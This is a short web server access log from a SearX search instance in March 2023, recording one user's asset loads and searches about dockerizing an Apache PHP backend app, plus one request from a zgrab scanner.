46.193.1.170 - - [27/Mar/2023:08:11:41 +0000] "GET /searx/static/plugins/js/search_on_category_select.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:08:11:41 +0000] "GET /searx/static/themes/oscar/fonts/glyphicons-halflings-regular.woff2 HTTP/1.1" 200 18028 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:08:11:41 +0000] "GET /searx/static/themes/oscar/img/favicon.png HTTP/1.1" 499 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:08:13:45 +0000] "GET /search?q=dockerize+an+apache+php+app HTTP/1.1" 200 8900 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:08:13:45 +0000] "GET /searx/static/themes/oscar/css/bootstrap.min.css HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:08:13:45 +0000] "GET /searx/static/themes/oscar/js/jquery.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:08:13:45 +0000] "GET /searx/static/themes/oscar/css/logicodev-dark.min.css HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:08:13:45 +0000] "GET /searx/static/themes/oscar/js/bootstrap.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:08:13:45 +0000] "GET /searx/static/themes/oscar/js/searx.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:08:13:45 +0000] "GET /searx/static/themes/oscar/js/typeahead.bundle.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:08:13:45 +0000] "GET /searx/static/plugins/js/search_on_category_select.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:08:13:45 +0000] "GET /searx/static/themes/oscar/fonts/glyphicons-halflings-regular.woff2 HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
192.241.206.81 - - [27/Mar/2023:08:15:35 +0000] "GET / HTTP/1.1" 200 415708 "-" "Mozilla/5.0 zgrab/0.x"
46.193.1.170 - - [27/Mar/2023:08:16:16 +0000] "GET /autocompleter?q=dockerize%20an%20apache%20php%20app HTTP/1.1" 200 2 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:08:16:18 +0000] "GET /autocompleter?q=dockerize%20an%20apache%20php%20bac%20app HTTP/1.1" 200 2 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:08:16:18 +0000] "GET /autocompleter?q=dockerize%20an%20apache%20php%20back%20app HTTP/1.1" 200 2 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:08:16:19 +0000] "GET /autocompleter?q=dockerize%20an%20apache%20php%20backend%20app HTTP/1.1" 200 2 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
